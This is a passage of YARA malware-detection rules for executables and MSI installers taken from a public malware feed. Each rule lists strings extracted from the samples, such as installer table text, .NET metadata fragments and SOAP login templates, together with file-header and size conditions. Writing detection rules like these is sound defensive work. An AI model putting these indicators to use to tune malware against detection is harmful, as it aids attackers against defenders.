      $s13 = "6731516771" ascii /* hex encoded string 'g1Qgq' */
      $s14 = "4763317167" ascii /* hex encoded string 'Gc1qg' */
      $s15 = "5326554663" ascii /* hex encoded string 'S&UFc' */
      $s16 = "d3dx11_43.dll" fullword ascii
      $s17 = "5466766773" ascii /* hex encoded string 'Tfvgs' */
      $s18 = "5766554633" ascii /* hex encoded string 'WfUF3' */
      $s19 = "3267766335" ascii /* hex encoded string '2gvc5' */
      $s20 = "ent#\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmp:CreatorTool=\"Ad" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 18000KB and
      1 of ($x*) and 4 of them
}

rule sig_5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95abe8b9 {
   meta:
      description = "evidences - file 5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95abe8b9.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95abe8b9"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\" xmlns:asmv2=\"urn:schemas-microsoft-com:asm.v2\"><a" ascii
      $x2 = "<ns1:getUserProductSerials xmlns:ns1=\"http://corel.com/subscription/SubscriptionService\"><getUserProductSerialsRequest userId=" wide
      $x3 = "<createAccount xmlns=\"http://corel.com/subscription/SubscriptionService\"><createAccountRequest userId=\"%s\" password=\"%s\" n" wide
      $x4 = "e=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"amd64\" publicKeyToken=\"6595" ascii
      $x5 = "GetSubscriptionRevisionResponseDump.txt" fullword wide
      $x6 = "ProcessDIMCommand - Could not open details file at: %s ErrorMessage is %s Cause is %d OsError is %d " fullword wide
      $x7 = "CPCUOnlineWebServices::ProcessWebServerErrorCode - Create account failed ('Invalid credentials')" fullword wide
      $x8 = "<subscriptionrevision xmlns:sub=\"http://corel.com/subscription/SubscriptionService\"><sub:getConfig><getConfigRequest>%s</getCo" wide
      $x9 = "<authenticateUser xmlns=\"http://ipmwebservices.corel.com/v1\"><authenticateUserRequest userId=\"%s\" password=\"%s\" licenseId=" wide
      $x10 = "<validateLicense xmlns=\"http://ipmwebservices.corel.com/v1\"><validateLicenseRequest userId=\"%s\" userToken=\"%s\" licenseId=" wide
      $x11 = "<setUserName xmlns=\"http://corel.com/subscription/SubscriptionService\"><setUserNameRequest userProfile=\"%s\" hash=\"%s\" firs" wide
      $x12 = "Calling Process DIM Command -URL: %s - Params: %s" fullword wide
      $x13 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"htt" wide
      $x14 = "<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap" wide
      $x15 = "<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap" wide
      $s16 = "OnPCUCommand - Condition not met, not executing the command:%d" fullword wide
      $s17 = "OnPCUCommand - Condition not met, not executing the command." fullword wide
      $s18 = "OnPCUCommand - Online Condition not met (system is offline), not executing the command:" fullword wide
      $s19 = "OnPCUCommand - Online Condition not met (system is online), not executing the command:" fullword wide
      $s20 = "WPCUCoreBase::ProcessStatus - RegType: %d - compatibility, returning" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 16000KB and
      1 of ($x*) and all of them
}

rule sig_90bc8a0bbefdcd114c58962e344314dcb07f897b652afc67874fb4feb7d46650 {
   meta:
      description = "evidences - file 90bc8a0bbefdcd114c58962e344314dcb07f897b652afc67874fb4feb7d46650.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "90bc8a0bbefdcd114c58962e344314dcb07f897b652afc67874fb4feb7d46650"
   strings:
      $x1 = "aoget_boget_coset_coUndoget_eoGetDynamicILInfoFieldInfofieldInfoMethodInfoget_TableInfoset_TableInfoLocalVariableInfoAssemblyNam" ascii
      $x2 = "R10000R3000R4000CreateMscorlibReferenceCLR10<>9__191_10MS_CLR_10get_IsClr10CreateMscorlibReferenceCLR20MS_CLR_20HotTable20HotHea" ascii
      $s3 = "CredStoreInitErrorScheduleServiceComInitErrorget_SupportsLastErrorset_SupportsLastErrorAssemblyRefProcessorAssemblyProcessorMeta" ascii
      $s4 = "gSystem.Net.Mail.MailPriority, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
      $s5 = "pExistingGetExistinginitializingdnlib.DotNet.ILogger.LogENCLogTaskEventLogGetEventLoglogReadInlineVarArgReadShortInlineVarArgget" ascii
      $s6 = "er.dllKillv2Collcollget_ProcessorArchitectureFullset_ProcessorArchitectureFullCreateFullCreateNullReadNoNullget_IsNullLdnullSyst" ascii
      $s7 = "get_StringReadStringLoadStringDownloadStringGetResolvedStringAddOperandStringGetOperandStringGetDllResourceStringReadInlineStrin" ascii
      $s8 = "onset_PowerShellConversionget_Sessionset_SessionEventLogSessionAllowingStartOnRemoteAppSessionget_DisallowStartOnRemoteAppSessio" ascii
      $s9 = "rSystem.Diagnostics.ProcessPriorityClass, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
      $s10 = "onStringSystem.IConvertible.ToStringV2GetTriggerStringReadUserStringCreateCounterSignatureAsStringReadElementContentAsStringFixe" ascii
      $s11 = "curityDescriptorCreateDecryptorCreateEncryptorNewarrFieldPtrMethodPtrParamPtrFnPtrStructureToPtrget_UIntPtrget_IntPtrReadIntPtrE" ascii
      $s12 = "scriptionset_DescriptionFormatDescriptiondescriptionSystem.Runtime.ConstrainedExecutionget_ReasonStringComparisonRepetitionPatte" ascii
      $s13 = "FileZSystem.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089<" fullword ascii
      $s14 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii
      $s15 = "XSystem.Guid, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089$00000000-0000-0000-0000-000000000000" fullword ascii
      $s16 = "EventHandlerFileSystemEventHandlerhandlerSystem.CodeDom.CompilerMicrosoft.Win32.TaskSchedulerget_Listenerset_ListenerIMetaDataLi" ascii
      $s17 = "geStorageCalculateStackUsageget_MessageSessionFailedToProcessMessagestatusMessageShowMessagemessagepercentageSystem.Diagnostics." ascii
      $s18 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii
      $s19 = "pletedget_IsCompletedisInheritedSessionProcessMainStartedSessionProcessStartedget_IsSortedset_IsSortedMDOnAllTablesSortedMDMostT" ascii
      $s20 = "SingleReadSingleSystem.IConvertible.ToSingleget_Fileset_FileGetV1SchemaFileWritePdbFileAddFileCreateFileExecuteFileResolveFilege" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule sig_0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364 {
   meta:
      description = "evidences - file 0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x3 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x4 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s5 = "ReachFramework.resources.dll" fullword wide
      $s6 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s7 = "Update.dll" fullword ascii
      $s8 = "get_loader_name_from_dll" fullword ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "process_config_directive" fullword ascii
      $s14 = "qgethostname" fullword ascii
      $s15 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s16 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s17 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s18 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s19 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s20 = "vloader_failure" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule sig_0f61988a48c814c8030ac8ba51dd7bbabd1dd39e019ffc8da6939932dd8d3217 {
   meta:
      description = "evidences - file 0f61988a48c814c8030ac8ba51dd7bbabd1dd39e019ffc8da6939932dd8d3217.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "0f61988a48c814c8030ac8ba51dd7bbabd1dd39e019ffc8da6939932dd8d3217"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x3 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x4 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s5 = "ReachFramework.resources.dll" fullword wide
      $s6 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s7 = "Update.dll" fullword ascii
      $s8 = "get_loader_name_from_dll" fullword ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "process_config_directive" fullword ascii
      $s14 = "qgethostname" fullword ascii
      $s15 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s16 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s17 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s18 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s19 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s20 = "vloader_failure" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_48c55a1c602eb9775660ab39122d7214882bd8a2f5edfb7bd710d90520856418 {
   meta:
      description = "evidences - file 48c55a1c602eb9775660ab39122d7214882bd8a2f5edfb7bd710d90520856418.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "48c55a1c602eb9775660ab39122d7214882bd8a2f5edfb7bd710d90520856418"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x3 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x4 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s5 = "ReachFramework.resources.dll" fullword wide
      $s6 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s7 = "Update.dll" fullword ascii
      $s8 = "get_loader_name_from_dll" fullword ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "process_config_directive" fullword ascii
      $s14 = "qgethostname" fullword ascii
      $s15 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s16 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s17 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s18 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s19 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s20 = "vloader_failure" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule sig_4bdfb31b28824d39594d59721f46a5a0524ab52a943b63a218a2709436c0fe9b {
   meta:
      description = "evidences - file 4bdfb31b28824d39594d59721f46a5a0524ab52a943b63a218a2709436c0fe9b.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "4bdfb31b28824d39594d59721f46a5a0524ab52a943b63a218a2709436c0fe9b"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x3 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x4 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s5 = "ReachFramework.resources.dll" fullword wide
      $s6 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s7 = "Update.dll" fullword ascii
      $s8 = "get_loader_name_from_dll" fullword ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "process_config_directive" fullword ascii
      $s14 = "qgethostname" fullword ascii
      $s15 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s16 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s17 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s18 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s19 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s20 = "vloader_failure" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_5b0dfa8f066cbafde8f04e6d6f3f3290c5ee78c2209aa8c19e0cda32e8b64756 {
   meta:
      description = "evidences - file 5b0dfa8f066cbafde8f04e6d6f3f3290c5ee78c2209aa8c19e0cda32e8b64756.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "5b0dfa8f066cbafde8f04e6d6f3f3290c5ee78c2209aa8c19e0cda32e8b64756"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x3 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x4 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s5 = "ReachFramework.resources.dll" fullword wide
      $s6 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s7 = "Update.dll" fullword ascii
      $s8 = "get_loader_name_from_dll" fullword ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "process_config_directive" fullword ascii
      $s14 = "qgethostname" fullword ascii
      $s15 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s16 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s17 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s18 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s19 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s20 = "vloader_failure" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule sig_907df555680a7f883b8768c9c2e058002e938e41fbc267394a212337ac635bbb {
   meta:
      description = "evidences - file 907df555680a7f883b8768c9c2e058002e938e41fbc267394a212337ac635bbb.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "907df555680a7f883b8768c9c2e058002e938e41fbc267394a212337ac635bbb"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x3 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x4 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s5 = "ReachFramework.resources.dll" fullword wide
      $s6 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s7 = "Update.dll" fullword ascii
      $s8 = "get_loader_name_from_dll" fullword ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "process_config_directive" fullword ascii
      $s14 = "qgethostname" fullword ascii
      $s15 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s16 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s17 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s18 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s19 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s20 = "vloader_failure" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule f5fee6a25203a847c92a0b30866ced1131a4962ba9e7353fc3dedb97d552bf4d {
   meta:
      description = "evidences - file f5fee6a25203a847c92a0b30866ced1131a4962ba9e7353fc3dedb97d552bf4d.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "f5fee6a25203a847c92a0b30866ced1131a4962ba9e7353fc3dedb97d552bf4d"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x3 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x4 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s5 = "ReachFramework.resources.dll" fullword wide
      $s6 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s7 = "Update.dll" fullword ascii
      $s8 = "get_loader_name_from_dll" fullword ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "process_config_directive" fullword ascii
      $s14 = "qgethostname" fullword ascii
      $s15 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s16 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s17 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s18 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s19 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s20 = "vloader_failure" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule e16baa228ab77485f38b335510270943ab54df755bf72987ac229d819bb85401 {
   meta:
      description = "evidences - file e16baa228ab77485f38b335510270943ab54df755bf72987ac229d819bb85401.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "e16baa228ab77485f38b335510270943ab54df755bf72987ac229d819bb85401"
   strings:
      $x1 = "NameTableTypeColumn_ValidationValueNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s3 = "tring GUID unique to this component, version, and language.Directory_DirectoryRequired key of a Directory table record. This is " ascii
      $s4 = " - UNREGISTERED - Wrapped using MSI Wrapper from www.exemsi.com" fullword wide
      $s5 = "NBZ.COMPANYNAMEEXEMSI.COMBZ.BASENAMEinstall.exeBZ.ELEVATE_EXECUTABLEneverBZ.INSTALLMODEEARLYBZ.WRAPPERVERSION11.0.53.0BZ.EXITCOD" ascii
      $s6 = "EDF412D9}ProductLanguage1033ProductNameMicrosoft EdgeProductVersionWIX_DOWNGRADE_DETECTEDWIX_UPGRADE_DETECTEDSecureCustomPropert" ascii
      $s7 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s8 = "MsiCustomActions.dll" fullword ascii
      $s9 = "C:\\ss2\\Projects\\MsiWrapper\\MsiCustomActions\\Release\\MsiCustomActions.pdb" fullword ascii
      $s10 = "Error removing temp executable." fullword wide
      $s11 = "EXPAND.EXE" fullword wide
      $s12 = "amFilesFolderbxjvilw7|[BZ.COMPANYNAME]TARGETDIR.SourceDirProductFeatureMain FeatureProductIconFindRelatedProductsLaunchCondition" ascii
      $s13 = " format.InstallExecuteSequenceInstallUISequenceLaunchConditionExpression which must evaluate to TRUE in order for install to com" ascii
      $s14 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s15 = "iesWIX_DOWNGRADE_DETECTED;WIX_UPGRADE_DETECTEDSOFTWARE\\[BZ.COMPANYNAME]\\MSI Wrapper\\Installed\\[BZ.WRAPPED_APPID]LogonUser[Lo" ascii
      $s16 = "tionDllbz.ProductComponent{EDE10F6C-30F4-42CA-B5C7-ADB905E45BFC}BZ.INSTALLFOLDERregLogonUserbz.EarlyInstallMain_InstallMain@4bz." ascii
      $s17 = "OS supports elevation" fullword wide
      $s18 = "OS does not support elevation" fullword wide
      $s19 = "lizeInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionbz.WrappedSetupProgrambz.CustomAc" ascii
      $s20 = "sValidateProductIDMigrateFeatureStatesProcessComponentsUnpublishFeaturesRemoveRegistryValuesWriteRegistryValuesResolveSourceNOT " ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule e04464a9c2236bdc798c112b4bfbe0d4265fe486154e3601d03e0e60cc1487ab {
   meta:
      description = "evidences - file e04464a9c2236bdc798c112b4bfbe0d4265fe486154e3601d03e0e60cc1487ab.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "e04464a9c2236bdc798c112b4bfbe0d4265fe486154e3601d03e0e60cc1487ab"
   strings:
      $x1 = "TableTypeComponent_Fileiepdf32.dll2.2.0.01033LanguageFileNameVersion119.0.6043.0hvhv.exeiepdf32SequenceAttributesFileSize59vfdsp" ascii
      $x2 = "type, entry, option flags.CustomSourceThe table reference of the source of the code.FormattedExcecution parameter, depends on th" ascii
      $x3 = "lidateProductIDInstallExecuteSequenceProcessComponentsUnpublishFeaturesRemoveFilesRemoveFoldersCreateFoldersRegisterUserRegister" ascii
      $s4 = "830796FB24}DirectoryDirectory_ParentDefaultDirTempFolderCaretTARGETDIR.SourceDirFeatureFeature_ParentTitleDescriptionDisplayLeve" ascii
      $s5 = "TableTypeComponent_Fileiepdf32.dll2.2.0.01033LanguageFileNameVersion119.0.6043.0hvhv.exeiepdf32SequenceAttributesFileSize59vfdsp" ascii
      $s6 = "stallInitializeInstallAdminPackageInstallFilesInstallFinalizeAdvtExecuteSequencePublishFeaturesPublishProductInstallUISequenceVa" ascii
      $s7 = "-E73F-4BCC-9867-8E84B233C8F0}AdminUISequenceCostInitializeFileCostCostFinalizeExecuteActionAdminExecuteSequenceInstallValidateIn" ascii
      $s8 = "dActionData.Number that determines the sort order in which the actions are to be executed. Leave blank to suppress action.Primar" ascii
